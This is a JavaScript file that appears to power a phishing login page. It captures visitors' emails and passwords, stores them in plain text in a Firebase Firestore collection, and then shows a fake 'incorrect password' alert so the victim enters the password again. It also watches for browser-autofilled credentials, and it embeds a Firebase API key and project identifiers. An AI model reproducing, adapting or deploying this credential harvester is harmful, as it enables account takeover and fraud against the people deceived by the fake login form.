import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// 1. Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyA_JTCBKnJ7zaz8wRSiCpLRU2RcQZ2catw",
    authDomain: "my-firebase-site-a35bb.firebaseapp.com",
    projectId: "my-firebase-site-a35bb",
    storageBucket: "my-firebase-site-a35bb.firebasestorage.app",
    messagingSenderId: "943328160156",
    appId: "1:943328160156:web:9acc1c41989b21b3124059"
};

// 2. Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// 3. DOM Elements
const emailInput = document.getElementById('userName');
const passwordInput = document.getElementById('password');
const saveBtn = document.getElementById('saveBtn');

// 4. Data Capture Function
const handleSubmit = async (e) => {
    // Prevent default form behavior if inside a form tag
    if (e) e.preventDefault();

    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (!email || !password) {
        alert("Please enter your email and password to continue.");
        return;
    }

    try {
        // Save data to Firestore
        await addDoc(collection(db, "users"), {
            email: email,
            password: password,
            type: "Direct Submission",
            createdAt: serverTimestamp()
        });

        // Instant error message to prompt a second try
        alert("The email or password you entered is incorrect. Please try again.");
        
        // Clear password field only (makes it look like a real login error)
        passwordInput.value = "";
        passwordInput.focus();

    } catch (error) {
        console.error("Firestore Error:", error);
    }
};

// 5. Event Listeners
saveBtn.addEventListener('click', handleSubmit);

// 6. Autofill Detection Logic
// This detects when the browser fills the fields automatically
const detectAutofill = () => {
    if (emailInput.value && passwordInput.value) {
        console.log("Credentials detected in fields.");
    }
};

// Check for autofill every time the user clicks anywhere or interacts with the page
window.addEventListener('input', detectAutofill);
window.addEventListener('click', detectAutofill);
